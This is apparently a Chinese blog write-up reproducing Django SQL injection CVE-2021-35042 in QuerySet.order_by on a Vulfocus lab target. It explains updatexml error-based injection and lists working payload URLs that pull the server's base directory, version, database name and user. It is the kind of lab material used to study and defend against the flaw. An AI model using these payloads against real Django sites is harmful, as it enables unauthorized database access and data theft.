# 原创
：  【漏洞复现-Django-SQL注入】Django-SQL注入CVE-2021-35042

# 【漏洞复现-Django-SQL注入】Django-SQL注入CVE-2021-35042

**目录**

[一、靶场环境](#%E4%B8%80%E3%80%81%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83)

[1.1、平台：](#1.1%E3%80%81%E5%B9%B3%E5%8F%B0%EF%BC%9A)

[1.2、知识:](#1.2%E3%80%81%E6%BC%8F%E6%B4%9E%E7%89%88%E6%9C%AC%3A)

[1.3、描述：](#1.3%E3%80%81%E6%8F%8F%E8%BF%B0%EF%BC%9A)

[二、漏洞验证](#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81)

[2.1、分析：](#2.1%E3%80%81%E5%88%86%E6%9E%90%EF%BC%9A)

[2.4、解题：](#2.4%E3%80%81%E8%A7%A3%E9%A2%98%EF%BC%9A)

---


## 一、靶场环境

> 
<h3>1.1、平台：</h3>
[Vulfocus 漏洞威胁分析平台](https://vulfocus.cn/)
123.58.224.8:30212

 
打开直接给了一个vuln接口（送分了属于是）

 


> 
<h3>1.2、知识:</h3>
1、也就是分析参数带入前后有没有发生变化了
但很多时候仅仅通过页面，是无法分析出的
（使用bp抓包后，对数据包分析是否有差别）
2、掌握基本函数，注入方法
updatexml报错注入
`concat()`函数是将其连成一个字符串，因此不会符合`XPath_string`的格式，因此会造成格式错误
`0x7e` ASCII码（为`~`），updatexml报错为特殊字符、字母及之后的内容，为了防止前面的字母丢失，开头连接一个特殊字符


> 
<h3>1.3、描述：</h3>
Django 3.2 ，3.1
允许 QuerySet.order_by SQL 注入。http://ip:port/vuln/?order=


---


---


## 二、漏洞验证

> 
<h3>2.1、分析：</h3>

http://ip:port/vuln/?order=id
(从1到4升序排列)
<img alt="" height="221" src="https://img-blog.csdnimg.cn/d5b54aaf708b4ab1a9a42b38238d0e83.png" width="1191"/> http://ip:port/vuln/?order=-id
 （从4到1降序排列）

返回的数据随值的改变而改变
 （带入到了数据库中被执行）
可以通过报错注入，来查看信息
http://ip:port/vuln/?order=vuln_collection.id);select updatexml(1, concat(0x7e,(select @@basedir)),1)%23

 /vuln/?order=vuln_collection.id);select updatexml(1, concat(0x7e,(select @@version)),1)%23

/vuln/?order=vuln_collection.id);select updatexml(1, concat(0x7e,(select database())),1)%23
<img alt="" height="525" src="https://img-blog.csdnimg.cn/6834e78d36854287bf906a0f47ab2781.png" width="1200"/> /vuln/?order=vuln_collection.id);select updatexml(1, concat(0x7e,(select user())),1)%23<img alt="" height="526" src="https://img-blog.csdnimg.cn/108b3f4269404222b39975305d4d3f84.png" width="1200"/>
 ……
（报数据库，表，字段，数据）
 


> 
<h3>2.4、解题：</h3>


 

